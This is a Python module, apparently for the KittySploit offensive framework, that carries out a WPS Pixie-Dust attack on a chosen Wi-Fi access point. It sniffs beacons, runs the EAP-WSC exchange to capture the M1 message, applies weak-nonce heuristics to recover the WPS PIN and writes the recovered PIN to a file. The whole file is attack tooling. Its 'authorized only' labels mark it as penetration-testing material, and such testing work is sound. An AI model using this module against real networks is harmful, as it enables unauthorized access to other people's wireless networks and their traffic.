#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""WPS Pixie-Dust probe (EAP-WSC exchange + weak-nonce heuristics, lab / authorized only)."""

from __future__ import annotations
import os
import time
from kittysploit import *
from lib.protocols.wlan.wlan_client import Wlan_client
from lib.protocols.wlan.wsc import MSG_M1


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi WPS Pixie-Dust Probe",
        "description": (
            "Associate, send EAP-WSC Start, capture M1/M2, and run pure-Python Pixie-Dust "
            "heuristics (weak nonce / null-PRNG patterns). Does not replace dedicated WPS tools."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "wps", "pixie", "802.11"],
        "references": ["https://attack.mitre.org/techniques/T1110/"],
        "attack": {
            "tactics": ["TA0006"],
            "techniques": ["T1110.002"],
            "prerequisites": [
                "WPS-enabled target AP (authorized)",
                "Inject-capable monitor interface",
            ],
        },
    }

    bssid = OptString("", "Target AP BSSID", required=True)
    ssid = OptString("", "SSID (must match AP)", required=True)
    channel = OptInteger(0, "AP channel (0 = skip ioctl set)", required=False)
    dwell = OptInteger(25, "WSC sniff window in seconds", required=False)
    sta_mac = OptString("", "Client MAC (empty = random)", required=False)

    def check(self):
        if not str(self.bssid or "").strip() or not str(self.ssid or "").strip():
            print_error("BSSID and SSID are required")
            return False
        return self.wlan_check_iface()

    def run(self):
        bssid = str(self.bssid).strip().lower()
        ssid = str(self.ssid).strip()
        ch = int(self.channel or 0)
        dwell = max(10, int(self.dwell or 25))
        sta = str(self.sta_mac or "").strip() or self.wlan_pmkid_sta_mac()

        wps = None
        if ch:
            self.wlan_set_channel(ch)

        def on_beacon(raw: bytes, _rssi: int | None) -> None:
            nonlocal wps
            beacon = self.wlan_parse_beacon(raw)
            if beacon and beacon.bssid.lower() == bssid:
                wps = self.wlan_wps_from_beacon(beacon)
                if wps:
                    print_info(
                        f"WPS AP | {wps.manufacturer or '?'} {wps.model_name or ''} | "
                        f"state={wps.wps_state or '?'}"
                    )

        print_status("Checking WPS beacon (4s)...")
        try:
            self.wlan_sniff(on_beacon, timeout=4.0)
        except (PermissionError, OSError):
            pass

        if wps is None:
            print_warning("No WPS vendor IE on beacons — attack may fail on this AP")

        print_info(f"WSC exchange → {ssid} ({bssid}) as {sta}")
        try:
            messages = self.wlan_wsc_associate_and_start(bssid, ssid, sta, dwell=float(dwell))
        except (PermissionError, OSError) as exc:
            print_error(f"WSC failed: {exc}")
            return False

        m1_list = [m for m in messages if getattr(m, "msg_type", 0) == MSG_M1]
        if not m1_list:
            print_warning("No WSC M1 observed — AP may have WPS locked or PMF-only")
            return False

        m1 = m1_list[0]
        report = self.wlan_analyze_pixie(m1, bssid, sta)
        print_info("=" * 72)
        print_info(f"  Manufacturer: {report.get('manufacturer') or '?'}")
        print_info(f"  Model:        {report.get('model') or '?'}")
        print_info(f"  Chipset:      {report.get('chipset_family') or '?'}")
        print_info(f"  UUID-R:       {report.get('uuid_r') or '?'}")
        pin = report.get("pin_guess")
        if pin:
            print_success(f"Pixie heuristic PIN guess: {pin}")
            out = os.path.abspath(f"wps_pixie_{bssid.replace(':', '')}.txt")
            with open(out, "w", encoding="utf-8") as handle:
                handle.write(f"BSSID={bssid}\nSSID={ssid}\nPIN={pin}\n")
            print_success(f"Saved: {out}")
            return True

        print_warning("Pixie heuristics did not recover a PIN — try passive capture or manual WPS analysis")
        return False